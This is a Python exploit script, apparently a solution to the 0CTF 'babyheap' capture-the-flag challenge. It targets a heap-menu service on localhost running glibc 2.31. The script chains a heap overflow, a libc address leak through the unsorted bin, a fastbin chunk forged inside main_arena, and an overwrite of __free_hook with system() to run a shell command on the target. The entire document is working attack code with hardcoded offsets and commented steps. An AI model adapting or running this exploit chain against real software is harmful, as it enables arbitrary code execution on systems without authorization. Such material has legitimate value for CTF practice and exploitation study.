import socket
from time import sleep

from utils import from_bytes, to_bytes, _is_int
from logger import Logger

logger = Logger("BABYHEAP")

SERVER_ADDR = ('localhost', 8889)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(SERVER_ADDR)

RECV_DELAY = 0.2

ALLOC = b'1\n'
FILL = b'2\n'
FREE = b'3\n'
DUMP = b'4\n'
EXIT = b'5\n'

def allocate_request(size):

    # size
    sock.recv(1024)
    sock.send(f"{_is_int(size)}\n".encode())

    sleep(RECV_DELAY)
    res: bytes = sock.recv(1024)

    res = res[:res.find(b'1. Allocate')]
    return res[15:16].decode()

def fill_request(idx, content):

    if type(content) == str:
        content = content.encode()

    sock.recv(1024)
    # idx
    sock.send(f"{_is_int(idx)}\n".encode())
    sock.recv(1024)
    # size
    sock.send(f"{len(content)}\n".encode())
    sock.recv(1024)

    # content
    sock.send(content)

    sleep(2 * RECV_DELAY)
    sock.recv(1024 * 1024)

    return None

def free_request(idx):

    # idx
    sock.recv(1024)
    sock.send(f"{_is_int(idx)}\n".encode())

    sleep(RECV_DELAY)
    sock.recv(1024)

    return None

def dump_request(idx):

    # idx
    sock.recv(1024)
    sock.send(f"{_is_int(idx)}\n".encode())

    sleep(RECV_DELAY)
    res: bytes = sock.recv(1024)

    res = res[:res.find(b'1. Allocate')]
    return res[10:-1]

def command(opt):

    sock.send(opt[0])

    if opt[0] is ALLOC:
        
        ch = allocate_request(*opt[1:])
        logger.log_info(f"chunk {ch} = calloc(1, {opt[1]})")
        return ch

    elif opt[0] is FILL:
        logger.log_info(f"filling chunk {opt[1]} with {len(opt[2])} bytes")
        return fill_request(*opt[1:])

    elif opt[0] is FREE:
        logger.log_info(f"free(chunk {opt[1]})")
        return free_request(*opt[1:])

    elif opt[0] is DUMP:
        logger.log_info(f"extracting bytes from chunk {opt[1]}")
        return dump_request(*opt[1:])

    elif opt[0] is EXIT:
        return None

def command_stream():

    # offsets for glibc 2.31, amd64 (ubuntu 20.04)
    UNSORTED_BIN_OFFSET = 0x1ebbf0 

    def _leak_unsorted_bin_addr():

        # leak unsorted bin address
        # 1) fill tcache for 0x8 and 0x30 requests (and for 0x40 for future steps)
        # 2) allocate 4 chunks of request size 0x8 (calloc with 0x8): p1, p2, p3, p4
        # 3) overflow p2 size with p1 to extend up to p4 (to include p3)
        # 4) free p2 and calloc for it again, so that the attacked binary will "update" p2's size
        # 5) restore p3's header and free it
        # 5) allocate one large chunk (for example 0x400) - this will force the consolidation of newly freed p3, 
        #                                                   and because of p4, the chunk cannot be merged with top,
        #                                                   so p3 chunk will be put inside unsorted bin
        # 6) dump p2 and get the unsorted bin address from p3.fd or p3.bk

        sock.recv(1024)

        v = []
        for _ in range(7):
            v.append(command((ALLOC, 0x8)))

        for i in range(7):
            command((FREE, v[i]))

        for _ in range(7):
            v[i] = command((ALLOC, 0x30))

        for i in range(7):
            command((FREE, v[i]))

        for _ in range(7):
            v[i] = command((ALLOC, 0x40))

        for i in range(7):
            command((FREE, v[i]))

        # allocate the 3 small-sized chunks
        p1 = command((ALLOC, 0x8))
        p2 = command((ALLOC, 0x8))
        p3 = command((ALLOC, 0x8))
        p4 = command((ALLOC, 0x8))

        command((FILL, p1, b'\x00' * 8 * 3 + to_bytes(0x41)))

        command((FREE, p2))

        p2_snd = command((ALLOC, 0x30))

        command((FILL, p2_snd, b'\x00' * 8 * 3 + to_bytes(0x21)))

        command((FREE, p3))

        command((ALLOC, 0x400))

        unsorted_bin_addr = int.from_bytes(command((DUMP, p2_snd))[8 * 4: 8 * 5], 'little')
        assert(unsorted_bin_addr == int.from_bytes(command((DUMP, p2_snd))[8 * 5: 8 * 6], 'little'))

        logger.log_success(f"unsorted bin address leaked: {hex(unsorted_bin_addr)}")
        return unsorted_bin_addr

    def _call_system():

        forger = command((ALLOC, 0x40))
        delivery = command((ALLOC, 0x40))
        guard0 = command((ALLOC, 0x40))

        #ch_binmap_sndbyte_0x1 = command((ALLOC, 0x410))
        #guard1 = command((ALLOC, 0x40))
        ch_binmap_sndbyte_0x16 = command((ALLOC, 0x500))
        guard2 = command((ALLOC, 0x40))
        ch_binmap_sndbyte_0x40 = command((ALLOC, 0x580))
        guard3 = command((ALLOC, 0x40))

        # together, after freeing, the bitmap will have second byte 
        # set to 0x51 - a valid field for a fastbin of requested size 0x40, with prev inuse set

        #command((FREE, ch_binmap_sndbyte_0x1))
        command((FREE, ch_binmap_sndbyte_0x16))
        command((FREE, ch_binmap_sndbyte_0x40))

        trigger_move_to_bin = command((ALLOC, 0x800))

        # allocating fastchunk inside main_arena struct
        # with binmap as the size field

        BINMAP_FASTCHUNK_UBIN_OFFSET = 2032

        command((FREE, delivery))
        command((FILL, forger, b'\x00' * 0x48 + to_bytes(0x51) + to_bytes(unsorted_bin_addr + BINMAP_FASTCHUNK_UBIN_OFFSET)))

        delivery = command((ALLOC, 0x40))

        logger.log_info(f"addr of forged ch: {hex(unsorted_bin_addr + BINMAP_FASTCHUNK_UBIN_OFFSET)}")
        binmap_forged_chunk = command((ALLOC, 0x40))
        
        command((FILL, binmap_forged_chunk, b'\x00' * 8 * 3 + b'\xff' * 8 * 2))

        FREE_HOOK_FORGED_CHUNK_OFFSET = 0x2738
        SYSTEM_OFFSET = 0x55410

        # restoring libc data, as much as possible
        # samples were extracted from a running gdb session

        with open("libcdata.bin", "rb") as fin:
            b = fin.read()

        base_addr = 0x00007ffff7dbe000
        end_addr = 0x00007ffff7fb2000

        bout = b''
        for i in range(0, len(b), 8):

            addr = from_bytes(b[i:i + 8])

            if base_addr <= addr <= end_addr:
                addr -= base_addr
                addr += libc_base_addr

            bout += to_bytes(addr)

        payload = b'\x00' * 8 * 3 + b'\xff' * 8 * 2 + bout

        # overriding free_hook and calling system with arguments from delivery chunk
        command((FILL, delivery, b"echo \"0ctf exploitation complete\" > HACKED\x00"))
        
        command((FILL, binmap_forged_chunk, payload[:FREE_HOOK_FORGED_CHUNK_OFFSET] + to_bytes(libc_base_addr + SYSTEM_OFFSET)))
        command((FREE, delivery))

    unsorted_bin_addr = _leak_unsorted_bin_addr()
    libc_base_addr = unsorted_bin_addr - UNSORTED_BIN_OFFSET

    logger.log_success(f"libc base address: {hex(libc_base_addr)}")
    _call_system()

if __name__ == "__main__":
    command_stream()

